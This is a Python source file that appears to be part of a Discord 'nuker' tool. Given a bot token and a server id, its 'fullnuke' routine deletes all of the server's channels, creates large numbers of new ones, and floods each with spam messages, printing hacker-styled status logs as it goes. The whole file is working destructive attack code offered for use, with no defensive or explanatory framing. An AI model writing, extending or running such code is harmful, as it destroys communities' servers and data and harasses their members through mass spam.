from core.utils.plugins import *

import discord

def div_lst(lst: list, size):
    return [lst[i: i + size] for i in range(0, len(lst), size)]

async def mass_channels(name, amnt, guild):
    for _ in range(amnt):
        await guild.create_text_channel(name)
        cur_time = datetime.now().strftime("[%H:%M:%S]")
        print(f"{b}{cur_time} {grn}[SUCESS]  {b}»   {faded('created a channel')}")

async def mass_delete(channel_list: list):
    for channel in channel_list:
        await channel.delete()
        cur_time = datetime.now().strftime("[%H:%M:%S]")
        print(f"{b}{cur_time} {grn}[SUCESS]  {b}»   {faded('deleted a channel')}")

async def spam_channel(channel_list, amount, content):
    for _ in range(amount):
        for channel in channel_list:
            await channel.send(content)
            cur_time = datetime.now().strftime("[%H:%M:%S]")
            print(f"{b}{cur_time} {grn}[SUCESS]  {b}»   {faded(f'sent {content}')}")





async def fn_init(guild_id, c_amount, name, ms_amount, content, token):
    intents = discord.Intents.all()
    bot = discord.Client(intents= intents)

    @bot.event
    async def on_ready():
        cur_time = datetime.now().strftime("[%H:%M:%S]")
        st = str(bot.user.name) + " loaded"
        print(f"{b}{cur_time} {grn}[CONNECTED]  {b}»   {faded(st)}")

        cd_tasks = []
        cc_tasks = []
        sac_tasks = []

        # Get required objects !
        guild = bot.get_guild(guild_id)
        
        # Stuff for deleting channels >:3 
        channel_list = guild.channels
        size = (len(channel_list) // 10) + 1
        chunked_list = div_lst(channel_list, size)

        # Stuff for creating new channels :3 
        amnt = c_amount // 10
        amnt_l = amnt - (amnt // 10)

        if c_amount > 10: 
            cc_tasks.append(mass_channels(name, amnt_l, guild))
        else:
            amnt = 1
        try: 
            for divd_channel in chunked_list:
                    task = mass_delete(divd_channel)
                    cd_tasks.append(task)
                    
            for _ in range(9):
                cc_tasks.append(mass_channels(name, amnt, guild))
            
            
            
            await asyncio.gather(*cd_tasks, )
            await asyncio.gather(*cc_tasks)

            channel_list = guild.channels
            size = (len(channel_list) // 10) + 1
            chunked_list = div_lst(channel_list, size)
            for divd_channel in chunked_list:
                    task = spam_channel(divd_channel, amount= ms_amount, content= content)
                    sac_tasks.append(task)

            await asyncio.gather(*sac_tasks)

        except discord.HTTPException as e:
            if e.status == 429:
                retry_after = int(e.response.headers.get("Retry-After", 5))
                print(f"{b}{cur_time} {r}[RATELIMIT]  {b}»   {faded(f'Ratelimited, retry after {retry_after} seconds')}")

        except Exception as e:
            cur_time = datetime.now().strftime("[%H:%M:%S]")
            print(f"{b}{cur_time} {r}[FAILURE]  {b}»   {faded(f'Issues arisen: {e}')}")
        
        finally: 
            await bot.close()
    
    try:
        await bot.start(token)
    finally:
        await bot.close()

async def fullnuke():
    while True:
        cls()

        print(banner)
        print(credits)
        print(full_nuke_menu)

        GUILD_ID = get_int_input(f"        {w}[{faded('?')}{w}] {faded('Enter guild id ')}  {b}→ {w}")
        c_amount = get_int_input(f"        {w}[{faded('?')}{w}] {faded('Enter number of new channels to create ')}  {b}→ {w}")        
        name = input(f"        {w}[{faded('?')}{w}] {faded('Enter name of new channels ')}  {b}→ {w}")
        ms_amount = get_int_input(f"        {w}[{faded('?')}{w}] {faded('Enter number of message for each channels ')}  {b}→ {w}")
        content = input(f"        {w}[{faded('?')}{w}] {faded('Enter content of message to send ')}  {b}→ {w}")

        confrm = cf()
        if confrm == "yes": pass 
        elif confrm == "no" or confrm == "back": return
        elif confrm == "edit": continue  

        cls()

        await fn_init(guild_id= GUILD_ID, c_amount= c_amount, name= name, content= content, ms_amount= ms_amount, token= TOKEN) 

        break
    return




